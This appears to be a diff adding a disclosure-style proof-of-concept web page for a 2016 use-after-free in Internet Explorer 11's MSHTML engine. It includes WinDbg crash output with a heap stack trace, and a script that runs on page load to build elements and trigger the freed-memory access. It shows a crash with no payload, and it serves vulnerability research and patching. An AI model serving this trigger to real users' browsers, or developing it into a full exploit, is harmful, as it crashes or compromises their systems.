@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="refresh" content="1"/>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta http-equiv="Expires" content="0" />
+  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
+  <meta http-equiv="Cache-Control" content="post-check=0, pre-check=0" />
+  <meta http-equiv="Pragma" content="no-cache" />
+  <style type="text/css">
+   body{
+        background-color:lime;
+        font-color:white;
+   };
+  </style>
+  <script type='text/javascript'></script>
+  <script type="text/javascript" language="JavaScript">
+      /*
+      *  Title: MSHTML!CMarkupPointer::UnEmbed Use After Free
+      *  Author: Marcin Ressel @ressel_m
+      *  Date: 15.04.2016
+      *  Vendor Homepage: www.microsoft.com
+      *  Software Link: n/a
+      *  Version: IE11 (latest)
+      *  Tested on: Windows 10 x64 && Windows 7 x64
+      *  --------------------------------------------------
+      *  IE 11 MSHTML!CMarkupPointer::UnEmbed Use After Free
+      *  IE 11.0.9600.18230 (win7)
+      *  Windows 7 x64, Windows 10 x64 (11.162.10586.0)
+      *  11.04.2016
+      *  
+         0:019> g
+         (490.1194): Access violation - code c0000005 (first chance)
+         First chance exceptions are reported before any exception handling.
+         This exception may be expected and handled.
+         eax=00000000 ebx=0df7bbd0 ecx=126e4f38 edx=00000000 esi=12750fd0 edi=00000000
+         eip=67028aa8 esp=0a97a658 ebp=0a97a7bc iopl=0         nv up ei pl nz ac po nc
+         cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010212
+         MSHTML!CSpliceTreeEngine::HandleRemovalMutations+0xdb:
+         67028aa8 8b7610          mov     esi,dword ptr [esi+10h] ds:002b:12750fe0=????????
+         0:007> !heap -p -a esi
+                address 12750fd0 found in
+                _DPH_HEAP_ROOT @ ad81000
+               in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
+                                    ffe3410:         12750000             2000
+               747790b2 verifier!AVrfDebugPageHeapFree+0x000000c2
+               77a5251c ntdll!RtlDebugFreeHeap+0x0000002f
+               77a0b2a2 ntdll!RtlpFreeHeap+0x0000005d
+               779b2ce5 ntdll!RtlFreeHeap+0x00000142
+               74a4adeb vrfcore!VerifierSetAPIClassName+0x0000017b
+               769d14bd kernel32!HeapFree+0x00000014
+               67011a67 MSHTML!MemoryProtection::HeapFree+0x00000046
+               66b08fff MSHTML!CMarkupPointer::UnEmbed+0x000000bd
+               66d75a96 MSHTML!CMarkupPointer::MoveToGap+0x00000094
+               67006183 MSHTML!CMarkupPointer::FindTextIdentity+0x000002b7
+               66d75a22 MSHTML!CDOMTextNode::GetParentNodeHelper+0x0000004b
+               6719351c MSHTML!CDOMNode::AppendTransientRegisteredObservers+0x00000035
+               66f192f7 MSHTML!CSpliceTreeEngine::HandleRemovalMutations+0xffef092a
+               66b47967 MSHTML!CSpliceTreeEngine::RemoveSplice+0x000051ef
+               66b49c9f MSHTML!CMarkup::SpliceTreeInternal+0x000000a8
+               66d8dc9b MSHTML!CDoc::CutCopyMove+0x00000d93
+               66b49a27 MSHTML!RemoveWithBreakOnEmpty+0x00000097
+               66b3400d MSHTML!CElement::InjectInternal+0x0000043f
+               66dd76d5 MSHTML!CElement::InjectTextOrHTML+0x00000323
+               66a857e8 MSHTML!CElement::Var_set_innerText+0x00000050
+               66a8576c MSHTML!CFastDOM::CHTMLElement::Trampoline_Set_innerText+0x0000003c
+               7330c572 jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x00000182
+               7330d075 jscript9!<lambda_73b9149c3f1de98aaab9368b6ff2ae9d>::operator()+0x0000009d
+               7330cfb2 jscript9!Js::JavascriptOperators::CallSetter+0x00000076
+               7333fdcc jscript9!Js::JavascriptOperators::SetProperty_Internal<0>+0x00000341
+               7333fb83 jscript9!Js::JavascriptOperators::OP_SetProperty+0x00000040
+               7333fc03 jscript9!Js::JavascriptOperators::PatchPutValueNoFastPath+0x0000004d
+               73308800 jscript9!Js::InterpreterStackFrame::Process+0x00002c1e
+               7330bd59 jscript9!Js::InterpreterStackFrame::InterpreterThunk<1>+0x00000200
+      */
+			function testcase()
+			{
+        var elements = [];
+				var eFrame = document.getElementById("e1"); 
+        var tmp = eFrame.contentWindow.document.createElement("body");
+				elements.push(tmp); 
+				tmp = eFrame.contentWindow.document.createElement("cite"); 
+			  elements.push(tmp); 
+				tmp = eFrame.contentWindow.document.createElement("frame"); 
+			  elements.push(tmp); 
+				tmp = eFrame.contentWindow.document.createElement("ellipse"); 
+				elements.push(tmp); 
+				tmp = eFrame.contentWindow.document.createElement("html"); 
+				elements.push(tmp); 
+				tmp = eFrame.contentWindow.document.createElement("command"); 
+			  elements.push(tmp);
+        var trg = document; 
+				trg.body.appendChild(elements[0]); 
+				trg.body.appendChild(elements[1]); 
+				trg.body.appendChild(elements[2]); 
+				trg.body.appendChild(elements[3]); 
+				trg.body.appendChild(elements[4]); 
+				trg.body.appendChild(elements[5]); 
+        dom = document.getElementsByTagName("*"); 
+        doc = document; 
+				trg = dom[10]; 
+			  var observer = new MutationObserver(new Function("",""));
+			  observer.observe(trg,{ attributes: true, childList: true, characterData: true, subtree: true}); 
+				trg.insertAdjacentHTML("afterBegin","<tbody><ol><script><polygon><circle><table></table><command><table></table><rp>"); 
+			 	trg.innerText = '12345'; 	
+			}
+  </script>
+  <title>IE 11.0.9600.18230 MSHTML!CMarkupPointer::UnEmbed UAF POC</title>
+  </head>
+  <body onload='testcase();'>
+   <iframe id='t1'></iframe><iframe id='e1'></iframe>
+   <div id='oneUnArg'>||||</div>
+  </body>
+</html>
